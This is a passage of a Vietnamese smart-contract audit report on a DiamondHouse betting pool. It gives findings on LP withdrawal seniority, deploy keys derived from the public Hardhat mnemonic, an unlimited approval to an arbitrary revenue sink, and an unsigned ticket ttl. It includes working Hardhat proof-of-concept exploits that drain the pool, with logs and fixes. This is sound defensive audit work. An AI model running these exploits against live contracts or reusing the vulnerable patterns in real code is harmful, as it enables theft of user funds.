Tách NAV khỏi nợ senior: `navPool() = pool − queueDebt`. NAV slice dùng `navPool`. Nếu `navPool = 0`, revert `nav empty` để không đốt share cho số tiền bằng 0. Lúc đó LP giữ nguyên share và yêu cầu rút.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 172–178*

```solidity
    function lanesIntact() public view returns (bool) {
        return balance() >= pool + openStakes + totalCredits;
    }
    /// NAV available to LPs: queued winners are senior (F-06).
    function navPool() public view returns (uint256) {
        return pool > queueDebt ? pool - queueDebt : 0;
    }
```


*`contracts/DiamondHouse.sol` · dòng 423–436*

```solidity
    function lpWithdraw() external nonReentrant {
        uint256 sh = lpPendingExit[msg.sender];
        require(sh > 0, "nothing");
        require(block.timestamp >= lpExitAvailableAt[msg.sender], "locked");
        lpPendingExit[msg.sender] = 0;
        // NAV slice computed BEFORE burning (F-06: senior queue debt is excluded)
        uint256 amount = sh * (navPool() + VIRTUAL_ASSETS) / (totalShares + VIRTUAL_SHARES);
        if (amount > navPool()) amount = navPool();
        // never burn shares for nothing: while queued winners owe more than the pool, NAV is 0
        // and the exit must wait (reverts → shares and the exit request are kept).
        require(amount > 0, "nav empty");
        totalShares -= sh;
        pool -= amount;
        _send(msg.sender, amount);
```


#### PoC sau sửa

*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 17–45*

```javascript
  it("LP withdraws its 100 USDC while winners' profit is still owed", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p1, p2 } = W.signers;
    // pool is empty: five winning 100-stake 2x tickets are fully queued (no LP yet)
    for (let i = 0; i < 5; i++) {
      const id = await buyTicket(W, i % 2 ? p1 : p2, 100, 2);
      await (await settleHouse(W, id, 1)).wait();
    }
    console.log(`  [EVIDENCE] queueDebt after 5 wins with empty pool = ${await W.house.queueDebt()} (6dp), pool = ${await W.house.pool()}`);
    await (await W.house.connect(lp).lpDeposit(U(100))).wait();   // LP enters the indebted pool
    console.log(`  [EVIDENCE] after LP deposit 100: pool=${await W.house.pool()}, queueDebt=${await W.house.queueDebt()}`);
    await (await W.house.connect(lp).lpRequestExit(await W.house.lpShares(lp.address))).wait();
    await timeTravel(7 * 86400 + 60);
    const b0 = await W.usdc.balanceOf(lp.address);
    const rW = await revertOf(W.house.connect(lp).lpWithdraw());
    const got = (await W.usdc.balanceOf(lp.address)) - b0;
    console.log(`  [EVIDENCE] lpWithdraw → ${rW ?? "OK"}, LP received ${Number(got) / 1e6} USDC`);
    console.log(`  [EVIDENCE] remaining queueDebt owed to winners = ${await W.house.queueDebt()} (6dp), pool = ${await W.house.pool()}`);
    if (!isFixed()) {
      expect(got).gte(U(100));                    // LP takes its full 100 USDC...
      expect(await W.house.queueDebt()).gt(0n);   // ...while winners remain unpaid
    } else {
      // F-06 fix: queued winners are senior. NAV = pool − queueDebt = 0, so the exit is refused
      // and the shares are NOT burned; the 100 USDC stays in the pool for the winners.
      expect(rW).to.equal("nav empty");
      expect(got).equal(0n);
      expect(await W.house.pool()).equal(U(100));
    }
  });
```


*`fixed-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] queueDebt after 5 wins with empty pool = 480050000 (6dp), pool = 0
  [EVIDENCE] after LP deposit 100: pool=100000000, queueDebt=480050000
  [EVIDENCE] lpWithdraw → nav empty, LP received 0 USDC
  [EVIDENCE] remaining queueDebt owed to winners = 480050000 (6dp), pool = 100000000
    ✔ LP withdraws its 100 USDC while winners' profit is still owed (913ms)
```


#### Đánh giá sau sửa

- LP rút được 0, pool giữ 100 USDC cho người thắng.
- Rủi ro còn lại: khi NAV = 0, LP không rút được cho đến khi có đủ tiền vào pool. Đây là đánh đổi có chủ đích, ưu tiên người thắng.

---

### 4.7 F-07 — Khoá ký deploy derive từ mnemonic công khai

**Mức độ:** Critical nếu hệ thống được deploy bằng khoá mặc định. **Loại:** ăn cắp qua khoá ký.

#### Mô tả và nguyên nhân gốc

`scripts/deploy.js` derive khoá quoter, attester và budgeter từ mnemonic ganache `test test ... junk`, là chuỗi công khai ai cũng biết. Script dùng các khoá này trực tiếp, không kiểm tra chain, không yêu cầu cấu hình khoá. Khi deploy lên mạng thật bằng script này, mọi người có thể ký quote, ký attestation WON và rút pool.

Đây là lỗi **cấu hình/vận hành**, không phải lỗi trong contract. Contract không thể biết khoá đã lộ.

#### Kịch bản khai thác

1. Kẻ tấn công derive khoá quoter (HD21) và hai attester (HD31, HD32) từ mnemonic công khai.
2. Hắn đặt cược, lấy quote hợp lệ từ quoter giả.
3. Hắn tự ký attestation WON với 2 khoá attester (đủ quorum 2-of-3).
4. Hắn gọi settle và rút thưởng từ pool.

#### Mã lỗi (mã gốc `3cb964b`, file `scripts/deploy.js`)

*`audit/vulnerable/scripts/deploy.js` · dòng 14–22*

```javascript
  const chainId = Number((await provider.getNetwork()).chainId);
  const accs = await provider.listAccounts();
  const owner = await provider.getSigner(accs[0].address);
  const hd = (i) => ethers.HDNodeWallet
    .fromPhrase("test test test test test test test test test test test junk", undefined, `m/44'/60'/0'/0/${i}`)
    .connect(provider);
  const quoter = hd(21), att1 = hd(31), att2 = hd(32), att3 = hd(33), budgeter = hd(41);

  const C = (n, s) => new ethers.ContractFactory(art(n).abi, art(n).bytecode, s);
```


*`audit/vulnerable/scripts/deploy.js` · dòng 84–92*

```javascript
      totalBps: 399, founderBps: 99, stakerBps: 300,
      founderWallet: ethers.ZeroAddress,
      note: "0.99% founder / 3.00% stakers; founder unset folds into active stakers",
    },
    demoStaking: { mintedToOwner: "100000 DIAMOND", stakedByOwner: "10000 DIAMOND" },
    keys: { quoter: quoter.address, attesters: [att1.address, att2.address, att3.address], budgeter: budgeter.address },
    note: "demo only — ganache deterministic mnemonic, DO NOT send real funds",
  };
  fs.writeFileSync(path.join(__dirname, "..", "deploy.json"), JSON.stringify(out, null, 2));
```


#### PoC

*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 55–78*

```javascript
  it("PoC (vulnerable): anyone holding the public mnemonic can quote a 50x ticket and attest it WON", async function () {
    if (isFixed()) return this.skip();   // fixed set: the keys are no longer public; see guard tests below
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p5: attacker } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();

    // The attacker re-derives every privileged key from the phrase printed in scripts/deploy.js
    const quoterKey = hd(21), att1Key = hd(31), att2Key = hd(32);
    console.log(`  [EVIDENCE] quoter  (HD21) = ${quoterKey.address}`);
    console.log(`  [EVIDENCE] attester(HD31) = ${att1Key.address}, attester(HD32) = ${att2Key.address}  (2-of-3 quorum)`);
    console.log(`  [EVIDENCE] derivation phrase = "test test ... test junk" (public ganache/hardhat mnemonic)`);

    const quoterIsOwn = (await W.house.quoterSigner()) === quoterKey.address;
    const id = await buyTicket(W, attacker, 1000, 50);          // same signing path, world uses HD21
    const pool0 = await W.house.pool();
    const sigs = await W.signOutcome(await W.ov.getAddress(), id, 1, [att1Key, att2Key]);
    const b0 = await W.usdc.balanceOf(attacker.address);
    const rc = await revertOf(W.house.connect(attacker).settleWithProof(id, 1, sigs));
    const profit = (await W.usdc.balanceOf(attacker.address)) - b0;
    console.log(`  [EVIDENCE] house.quoterSigner == derived HD21? ${quoterIsOwn}`);
    console.log(`  [EVIDENCE] WON attested with derived attester keys → ${rc ?? "OK"}; attacker received ${Number(profit) / 1e6} USDC from pool (pool before=${pool0})`);
    expect(rc).to.equal(null);
    expect(profit).gt(U(40_000));
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] quoter  (HD21) = 0x02484cb50AAC86Eae85610D6f4Bf026f30f6627D
  [EVIDENCE] attester(HD31) = 0x8263Fce86B1b78F95Ab4dae11907d8AF88f841e7, attester(HD32) = 0xcF2d5b3cBb4D7bF04e3F7bFa8e27081B52191f91  (2-of-3 quorum)
  [EVIDENCE] derivation phrase = "test test ... test junk" (public ganache/hardhat mnemonic)
  [EVIDENCE] house.quoterSigner == derived HD21? true
  [EVIDENCE] WON attested with derived attester keys → OK; attacker received 48044.9 USDC from pool (pool before=100000000000)
    ✔ PoC (vulnerable): anyone holding the public mnemonic can quote a 50x ticket and attest it WON (129ms)
```


#### Đề xuất sửa

Không có khoá mặc định. Nếu thiếu khoá qua biến môi trường, script từ chối (exit 2) trước khi chạm vào mạng. Khoá mặc định chỉ được dùng khi `DEMO_KEYS=1` **và** chainId là local (31337 hoặc 1337). Kiểm tra này chạy trước khi kết nối RPC.

#### Mã sau sửa

*`scripts/deploy.js` · dòng 14–45*

```javascript
const DEMO_MNEMONIC = "test test test test test test test test test test test junk";
const LOCAL_CHAIN_IDS = new Set([31337, 1337]);   // hardhat/anvil, ganache
const ENV_KEYS = ["QUOTER_KEY", "ATTESTER_KEY_1", "ATTESTER_KEY_2", "ATTESTER_KEY_3", "BUDGETER_KEY"];

function refuse(msg) {
  console.error("deploy refused: " + msg);
  process.exit(2);
}

/** Resolve the signing roles or refuse. Returns { quoter, att1, att2, att3, budgeter } wallets (unconnected). */
function resolveKeys(chainId) {
  if (process.env.DEMO_KEYS === "1") {               // chainId===null ⇒ caller will re-check on-chain
    if (chainId === null || !LOCAL_CHAIN_IDS.has(chainId)) refuse(`DEMO_KEYS=1 is only allowed on local chains (got chainId ${chainId})`);
    const hd = (i) => ethers.HDNodeWallet.fromPhrase(DEMO_MNEMONIC, undefined, `m/44'/60'/0'/0/${i}`);
    return { quoter: hd(21), att1: hd(31), att2: hd(32), att3: hd(33), budgeter: hd(41), demo: true };
  }
  const missing = ENV_KEYS.filter((k) => !process.env[k]);
  if (missing.length) refuse(`no signing keys (missing env: ${missing.join(", ")}); set them or use DEMO_KEYS=1 on a local chain`);
  const w = (k) => new ethers.Wallet(process.env[k]);
  return { quoter: w("QUOTER_KEY"), att1: w("ATTESTER_KEY_1"), att2: w("ATTESTER_KEY_2"),
           att3: w("ATTESTER_KEY_3"), budgeter: w("BUDGETER_KEY"), demo: false };
}

const art = (n) => JSON.parse(fs.readFileSync(path.join(__dirname, "..", "build", `${n}.json`), "utf8"));
const U = (n) => BigInt(n) * 10n ** 6n;
const E18 = (n) => BigInt(n) * 10n ** 18n;

(async () => {
  // F-07: refuse BEFORE touching the network when no explicit keys and no demo opt-in exist.
  if (process.env.DEMO_KEYS !== "1") resolveKeys(null);   // env path: missing keys → exit 2
  const rpc = process.env.RPC || "http://127.0.0.1:8545";
  const provider = new ethers.JsonRpcProvider(rpc);
```


#### PoC sau sửa

Trên nhánh fixed, PoC tấn công ở trên được đánh dấu **pending** (đúng thiết kế: không còn gì để tấn công). Thay vào đó, hai test dưới đây kiểm guard: chạy `deploy.js` thật, bắt exit code và thông báo, và kiểm việc từ chối `DEMO_KEYS=1` trên chainId 1 qua một RPC stub.

*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 93–100*

```javascript
  it("fixed: deploy.js refuses to run without explicit keys (exit 2, no demo fallback)", async function () {
    if (!isFixed()) return this.skip();
    const r = await runDeploy({}, "http://127.0.0.1:9");        // unreachable RPC: a refusal must not need it
    console.log(`  [EVIDENCE] deploy.js (no keys, no DEMO_KEYS) → exit ${r.code}: ${r.out.trim().split("\n").pop()}`);
    expect(r.code).to.equal(2);
    expect(r.out.includes("deploy refused")).to.equal(true);
    expect(r.out.includes("ECONNREFUSED")).to.equal(false);
  });
```


*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 102–121*

```javascript
  it("fixed: DEMO_KEYS=1 is refused on a non-local chain (public mnemonic never signs on a real network)", async function () {
    if (!isFixed()) return this.skip();
    // minimal JSON-RPC stub that reports chainId 1 (Ethereum mainnet)
    const srv = http.createServer((req, res) => {
      let body = ""; req.on("data", (c) => (body += c)); req.on("end", () => {
        const msg = JSON.parse(body || "{}");
        const result = msg.method === "eth_chainId" ? "0x1" : msg.method === "net_version" ? "1" : null;
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result }));
      });
    });
    await new Promise((ok) => srv.listen(0, "127.0.0.1", ok));
    const rpc = `http://127.0.0.1:${srv.address().port}`;
    try {
      const r = await runDeploy({ DEMO_KEYS: "1" }, rpc);
      console.log(`  [EVIDENCE] deploy.js (DEMO_KEYS=1, chainId 1) → exit ${r.code}: ${r.out.trim().split("\n").pop()}`);
      expect(r.code).to.equal(2);
      expect(r.out.includes("only allowed on local chains")).to.equal(true);
    } finally { srv.close(); }
  });
```


*`fixed-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] deploy.js (no keys, no DEMO_KEYS) → exit 2: deploy refused: no signing keys (missing env: QUOTER_KEY, ATTESTER_KEY_1, ATTESTER_KEY_2, ATTESTER_KEY_3, BUDGETER_KEY); set them or use DEMO_KEYS=1 on a local chain
    ✔ fixed: deploy.js refuses to run without explicit keys (exit 2, no demo fallback) (105ms)
```


*`fixed-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] deploy.js (DEMO_KEYS=1, chainId 1) → exit 2: deploy refused: DEMO_KEYS=1 is only allowed on local chains (got chainId 1)
    ✔ fixed: DEMO_KEYS=1 is refused on a non-local chain (public mnemonic never signs on a real network) (125ms)
```


#### Đánh giá sau sửa

- Guard đã hoạt động cho cả hai trường hợp: không có khoá và `DEMO_KEYS=1` trên chainId 1.
- Phần còn lại: khoá production phải được tạo và lưu ngoài repo (KMS/HSM). Đây là việc vận hành (mục 6).
- Test PoC gốc chỉ chạy trên nhánh vulnerable (ở nhánh fixed nó được đánh dấu pending, đúng thiết kế).

---

### 4.8 F-08 — Sink tuỳ ý và approve vô hạn không thu hồi

**Mức độ:** High (phụ thuộc quyền owner). **Loại:** ăn cắp qua allowance.

#### Mô tả và nguyên nhân gốc

`setRevenueSink(s)` làm hai việc: đặt `revenueSink = s` và `approve(s, type(uint256).max)`. Nó không kiểm `s` có phải contract hay không, và không thu hồi approve của sink cũ khi đổi. Hệ quả:

- Nếu owner đặt sink là một EOA, EOA đó có thể gọi `transferFrom` và kéo toàn bộ USDC của House, gồm pool và stake đang mở.
- Sau khi đổi sink, sink cũ vẫn có approve vô hạn và vẫn kéo được tiền.

#### Kịch bản khai thác

1. Owner (hoặc kẻ đã chiếm quyền owner) gọi `setRevenueSink(EOA)`.
2. EOA gọi `transferFrom(House, EOA, balance)` → nhận 102,000 USDC.
3. Hoặc: owner đổi sink sang contract mới, sink cũ vẫn kéo được phần còn lại.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 392–398*

```solidity
    function setQuoter(address qa) external onlyOwner { require(qa != address(0), "zero"); quoterSigner = qa; emit ParamSet("quoter", uint256(uint160(qa))); }
    function setOutcomeVerifier(address v) external onlyOwner { require(v != address(0), "zero"); outcomeVerifier = v; emit ParamSet("verifier", uint256(uint160(v))); }
    function setRevenueSink(address s) external onlyOwner {
        revenueSink = s;
        require(usdc.approve(s, type(uint256).max), "approve");
        emit ParamSet("revenueSink", uint256(uint160(s)));
    }
```


*`audit/vulnerable/contracts/DiamondOptions.sol` · dòng 292–298*

```solidity
    }
    function setQuoter(address qa) external onlyOwner { require(qa != address(0), "zero"); quoterSigner = qa; emit ParamSet("quoter", uint256(uint160(qa))); }
    function setRevenueSink(address s) external onlyOwner {
        revenueSink = s;
        require(usdc.approve(s, type(uint256).max), "approve");
        emit ParamSet("revenueSink", uint256(uint160(s)));
    }
```


#### PoC

*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 126–168*

```javascript
  it("owner points revenueSink at an EOA: the EOA drains House, including open player stakes", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p1, p5: rugger } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    await buyTicket(W, p1, 2_000, 2);                           // 2,000 USDC of player stake is OPEN
    const before = await W.usdc.balanceOf(W.hA);
    console.log(`  [EVIDENCE] House holds ${Number(before) / 1e6} USDC (pool 100,000 + open player stake 2,000)`);
    const rSet = await revertOf(W.house.connect(owner).setRevenueSink(rugger.address));
    console.log(`  [EVIDENCE] owner.setRevenueSink(EOA) → ${rSet ?? "OK"}`);
    const eoa0 = await W.usdc.balanceOf(rugger.address);
    const rDrain = await revertOf(W.usdc.connect(rugger).transferFrom(W.hA, rugger.address, before));
    console.log(`  [EVIDENCE] EOA.transferFrom(House → EOA, all) → ${rDrain ?? "OK"}; EOA gained ${Number((await W.usdc.balanceOf(rugger.address)) - eoa0) / 1e6} USDC`);

    // stale approval: rotate the sink away from the attacker — its allowance must be revoked
    const W2 = await makeWorld({ withOptions: false, classCap: U(50_000) });
    await (await W2.house.connect(W2.signers.lp).lpDeposit(U(1000))).wait();
    let rStale = null, staleLeft = 0n;
    if (!isFixed()) {
      // vulnerable: an EOA may become sink, and the approval outlives the rotation
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(W2.signers.p4.address)).wait();
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(W2.sA)).wait();   // rotate back to RevenueSplit
      rStale = await revertOf(W2.usdc.connect(W2.signers.p4).transferFrom(W2.hA, W2.signers.p4.address, U(1)));
      console.log(`  [EVIDENCE] previous sink after rotation: transferFrom(House, 1 USDC) → ${rStale ?? "OK (allowance never revoked)"}`);
    } else {
      // fixed: sinks must be contracts; rotation revokes the old sink's allowance
      const oldSink = await deploy("fixed", "RevenueSplit", [await W2.usdc.getAddress(), await W2.diamond.getAddress()], W2.signers.owner);
      const oldAddr = await oldSink.getAddress();
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(oldAddr)).wait();
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(W2.sA)).wait();   // rotate back
      staleLeft = await W2.usdc.allowance(W2.hA, oldAddr);
      console.log(`  [EVIDENCE] fixed: allowance House→previous sink after rotation = ${staleLeft}`);
    }

    if (!isFixed()) {
      expect(rDrain).to.equal(null);
      expect(await W.usdc.balanceOf(W.hA)).to.equal(0n);
      expect(rStale).to.equal(null);
    } else {
      expect(rSet).to.equal("sink must be a contract");   // EOA sink refused outright
      expect(rDrain).to.equal("allowance");               // no standing approval to any EOA
      expect(staleLeft).to.equal(0n);                     // rotation revoked the old sink
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] House holds 102000 USDC (pool 100,000 + open player stake 2,000)
  [EVIDENCE] owner.setRevenueSink(EOA) → OK
  [EVIDENCE] EOA.transferFrom(House → EOA, all) → OK; EOA gained 102000 USDC
  [EVIDENCE] previous sink after rotation: transferFrom(House, 1 USDC) → OK (allowance never revoked)
    ✔ owner points revenueSink at an EOA: the EOA drains House, including open player stakes (197ms)
```


#### Đề xuất sửa

1. `require(s.code.length > 0)`: sink phải là contract.
2. Khi đổi sink, thu hồi approve của sink cũ (`approve(old, 0)`).
3. Không approve vô hạn. Approve đúng số tiền cho mỗi lần `notifyRevenue`, dùng một lần.
4. Đổi quoter và verifier phải qua timelock 2 ngày (`proposeX` / `executeX`). Lần thiết lập đầu tiên vẫn tức thì để script deploy chạy được.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 337–337*

```solidity
            require(usdc.approve(sink, stakerAmt), "approve");  // F-08: exact, single-use allowance
```


*`contracts/DiamondHouse.sol` · dòng 470–505*

```solidity
    // F-08: the signing roots can only be swapped through a public 2-day timelock once set.
    // Initial wiring (zero → value) stays immediate so deployment scripts keep working.
    function proposeQuoter(address qa) external onlyOwner {
        require(qa != address(0), "zero");
        pendingQuoter = Pending(qa, uint64(block.timestamp + GOV_DELAY));
        emit GovProposed("quoter", qa, pendingQuoter.eta);
    }
    function executeQuoter() external {
        Pending memory p = pendingQuoter;
        require(p.who != address(0) && block.timestamp >= p.eta, "not ready");
        quoterSigner = p.who; delete pendingQuoter;
        emit ParamSet("quoter", uint256(uint160(p.who)));
    }
    function proposeOutcomeVerifier(address v) external onlyOwner {
        require(v != address(0), "zero");
        pendingVerifier = Pending(v, uint64(block.timestamp + GOV_DELAY));
        emit GovProposed("verifier", v, pendingVerifier.eta);
    }
    function executeOutcomeVerifier() external {
        Pending memory p = pendingVerifier;
        require(p.who != address(0) && block.timestamp >= p.eta, "not ready");
        outcomeVerifier = p.who; delete pendingVerifier;
        emit ParamSet("verifier", uint256(uint160(p.who)));
    }
    function setOutcomeVerifier(address v) external onlyOwner {
        require(v != address(0) && outcomeVerifier == address(0), "timelocked: use proposeOutcomeVerifier");
        outcomeVerifier = v; emit ParamSet("verifier", uint256(uint160(v)));
    }
    /// Rotating the sink revokes the previous sink's allowance (no stale spender).
    function setRevenueSink(address s) external onlyOwner {
        require(s.code.length > 0, "sink must be a contract");   // F-08: an EOA sink would brick settlements
        if (revenueSink != address(0)) usdc.approve(revenueSink, 0);
        revenueSink = s;                       // no standing approval: see _streamFee / distributeRevenue
        emit ParamSet("revenueSink", uint256(uint160(s)));
    }
    function setFounderWallet(address f) external onlyOwner { founderWallet = f; emit ParamSet("founderWallet", uint256(uint160(f))); }
```


#### PoC sau sửa

*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 126–168*

```javascript
  it("owner points revenueSink at an EOA: the EOA drains House, including open player stakes", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p1, p5: rugger } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    await buyTicket(W, p1, 2_000, 2);                           // 2,000 USDC of player stake is OPEN
    const before = await W.usdc.balanceOf(W.hA);
    console.log(`  [EVIDENCE] House holds ${Number(before) / 1e6} USDC (pool 100,000 + open player stake 2,000)`);
    const rSet = await revertOf(W.house.connect(owner).setRevenueSink(rugger.address));
    console.log(`  [EVIDENCE] owner.setRevenueSink(EOA) → ${rSet ?? "OK"}`);
    const eoa0 = await W.usdc.balanceOf(rugger.address);
    const rDrain = await revertOf(W.usdc.connect(rugger).transferFrom(W.hA, rugger.address, before));
    console.log(`  [EVIDENCE] EOA.transferFrom(House → EOA, all) → ${rDrain ?? "OK"}; EOA gained ${Number((await W.usdc.balanceOf(rugger.address)) - eoa0) / 1e6} USDC`);

    // stale approval: rotate the sink away from the attacker — its allowance must be revoked
    const W2 = await makeWorld({ withOptions: false, classCap: U(50_000) });
    await (await W2.house.connect(W2.signers.lp).lpDeposit(U(1000))).wait();
    let rStale = null, staleLeft = 0n;
    if (!isFixed()) {
      // vulnerable: an EOA may become sink, and the approval outlives the rotation
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(W2.signers.p4.address)).wait();
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(W2.sA)).wait();   // rotate back to RevenueSplit
      rStale = await revertOf(W2.usdc.connect(W2.signers.p4).transferFrom(W2.hA, W2.signers.p4.address, U(1)));
      console.log(`  [EVIDENCE] previous sink after rotation: transferFrom(House, 1 USDC) → ${rStale ?? "OK (allowance never revoked)"}`);
    } else {
      // fixed: sinks must be contracts; rotation revokes the old sink's allowance
      const oldSink = await deploy("fixed", "RevenueSplit", [await W2.usdc.getAddress(), await W2.diamond.getAddress()], W2.signers.owner);
      const oldAddr = await oldSink.getAddress();
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(oldAddr)).wait();
      await (await W2.house.connect(W2.signers.owner).setRevenueSink(W2.sA)).wait();   // rotate back
      staleLeft = await W2.usdc.allowance(W2.hA, oldAddr);
      console.log(`  [EVIDENCE] fixed: allowance House→previous sink after rotation = ${staleLeft}`);
    }

    if (!isFixed()) {
      expect(rDrain).to.equal(null);
      expect(await W.usdc.balanceOf(W.hA)).to.equal(0n);
      expect(rStale).to.equal(null);
    } else {
      expect(rSet).to.equal("sink must be a contract");   // EOA sink refused outright
      expect(rDrain).to.equal("allowance");               // no standing approval to any EOA
      expect(staleLeft).to.equal(0n);                     // rotation revoked the old sink
    }
  });
```


Nhánh fixed kiểm: đặt EOA làm sink bị từ chối, EOA không rút được gì, và allowance của sink cũ bằng 0 sau khi đổi.

*`fixed-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] House holds 102000 USDC (pool 100,000 + open player stake 2,000)
  [EVIDENCE] owner.setRevenueSink(EOA) → sink must be a contract
  [EVIDENCE] EOA.transferFrom(House → EOA, all) → allowance; EOA gained 0 USDC
  [EVIDENCE] fixed: allowance House→previous sink after rotation = 0
    ✔ owner points revenueSink at an EOA: the EOA drains House, including open player stakes (222ms)
```


#### Đánh giá sau sửa

- EOA không còn rút được. Allowance của sink cũ bằng 0.
- Phần còn lại: owner vẫn đổi được sink (sau khi kiểm mã). Đây là quyền vận hành cần timelock hoặc multisig (mục 6).

---

### 4.9 F-09 — `ttl` không nằm trong chữ ký quote

**Mức độ:** High (kinh tế). **Loại:** người mua chọn thời hạn để có EV dương.

#### Mô tả và nguyên nhân gốc

Giá (multiplier) của quote được định theo một thời hạn τ = 60 giây (`engine/pricer.js`). Nhưng typehash của quote không chứa `ttl`. `buyTicket(q, sig, minMult, ttl)` nhận `ttl` từ người gọi và không kiểm với giá đã định. Cùng một quote, người mua có thể chọn ttl = 30 hoặc ttl = 300 giây.

Với giá định theo τ = 60, EV của người mua thay đổi mạnh theo ttl. Đây là lỗ hổng định giá: house trả tiền cho sự chênh lệch.

#### Kịch bản khai thác

1. Quoter ký một quote với giá định theo τ = 60.
2. Người mua gọi `buyTicket` với ttl = 30 (nếu vé ngắn hạn có EV dương cho người mua).
3. Với σ = 0.0004, EV của người mua là +33.5% ở ttl 30, −4.0% ở ttl 60, −31.5% ở ttl 120, −56.5% ở ttl 300. Bảng đầy đủ cho cả σ = 0.0002, 0.0004 và 0.0008 nằm trong log PoC bên dưới. Người mua chọn ttl có EV dương.

#### Mã lỗi (mã gốc)

Typehash không có `ttl`:

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 74–77*

```solidity
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant QUOTE_TYPEHASH = keccak256(
        "Quote(uint8 classId,uint8 dir,uint128 stake,uint32 multX1e4,uint64 validUntil,bytes32 salt,address buyer)");
    uint256 public constant BPS = 10_000;
```


Hàm mua vé nhận `ttl` từ người gọi và không ràng buộc với chữ ký:

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 173–176*

```solidity
    function buyTicket(Quote calldata q, bytes calldata sig, uint32 minMultX1e4, uint64 ttl)
        external nonReentrant returns (uint256 id)
    {
        require(ttl == 30 || ttl == 60 || ttl == 120 || ttl == 300, "bad ttl");
```


Quoter off-chain cũng không có `ttl` trong kiểu dữ liệu ký:

*`audit/vulnerable/engine/quoter.js` · dòng 3–6*

```javascript
export const HOUSE_TYPES = { Quote: [
  { name: "classId", type: "uint8" }, { name: "dir", type: "uint8" },
  { name: "stake", type: "uint128" }, { name: "multX1e4", type: "uint32" },
  { name: "validUntil", type: "uint64" }, { name: "salt", type: "bytes32" },
```


#### PoC

*`audit/test/F09-F10-quote-binding.test.js` · dòng 16–38*

```javascript
  it("the same quote is accepted with ttl=30 and ttl=300 (vulnerable) — expiry is buyer's choice", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p1 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    const { q, sig } = await signHouseQuote(W, { stake: U(100), multX1e4: X(3) }, p1, 60);
    const rShort = await revertOf(W.house.connect(p1).buyTicket(q, sig, X(3), 30));
    const rLong = await revertOf(W.house.connect(p1).buyTicket(q, sig, X(3), 300));
    const exp = async (id) => (await W.house.tickets(id)).expiry;
    const n = Number(await countTickets(W));
    console.log(`  [EVIDENCE] same signed quote: buy(ttl=30) → ${rShort ?? "OK"}, buy(ttl=300) → ${rLong ?? "OK"}`);
    if (!isFixed()) {
      expect(rShort).to.equal(null);
      expect(rLong).to.equal(null);
      const e1 = await exp(n - 2), e2 = await exp(n - 1);
      console.log(`  [EVIDENCE] resulting tickets ${n - 2},${n - 1} expiry delta = ${Number(e2 - e1)} s for an identical quote`);
      expect(e2 - e1 >= 270n && e2 - e1 <= 275n).to.equal(true); // 270 s + block-time jitter
    } else {
      // quote was signed with ttl=60: any other ttl is rejected, honest buyer uses 60
      expect(rShort).to.equal("ttl mismatch");
      expect(rLong).to.equal("ttl mismatch");
      expect(await revertOf(W.house.connect(p1).buyTicket(q, sig, X(3), 60))).to.equal(null);
    }
  });
```


*`audit/test/F09-F10-quote-binding.test.js` · dòng 40–59*

```javascript
  it("economic impact at τ=60 pricing (engine/pricer.js, same σ fallback as engine/index.js)", async () => {
    const { bustProb, offerMultiplier } = require("../../engine/pricer.js");
    const L = 1000, rho = 0.0399;
    const rows = [];
    for (const sigma of [0.0002, 0.0004, 0.0008]) {
      const { mOffer } = offerMultiplier(L, sigma, 60, rho);       // price quoted to the buyer
      for (const tau of [30, 60, 120, 300]) {
        const pWin = 1 - bustProb(L, sigma, tau);                  // survive τ with the real ttl
        const ev = pWin * mOffer - 1;                              // buyer expected value / stake
        rows.push({ sigma, tau, mOffer: mOffer.toFixed(3), pWin: pWin.toFixed(3), ev: (ev * 100).toFixed(1) + "%" });
      }
    }
    console.log("  [EVIDENCE] buyer EV per unit stake when quote = τ60 price and ttl is chosen by buyer:");
    console.log("  σ/s      ttl   M_offer   P(win)   buyerEV");
    for (const r of rows) console.log(`  ${String(r.sigma).padEnd(8)} ${String(r.tau).padEnd(5)} ${r.mOffer.padEnd(9)} ${r.pWin.padEnd(8)} ${r.ev}`);
    const evShort = rows.find((r) => r.sigma === 0.0004 && r.tau === 30);
    const evFair = rows.find((r) => r.sigma === 0.0004 && r.tau === 60);
    console.log(`  [EVIDENCE] at σ=0.0004: ttl=60 → EV ${evFair.ev}; ttl=30 → EV ${evShort.ev} (house pays the difference)`);
    expect(parseFloat(evShort.ev)).gt(parseFloat(evFair.ev));
  });
```


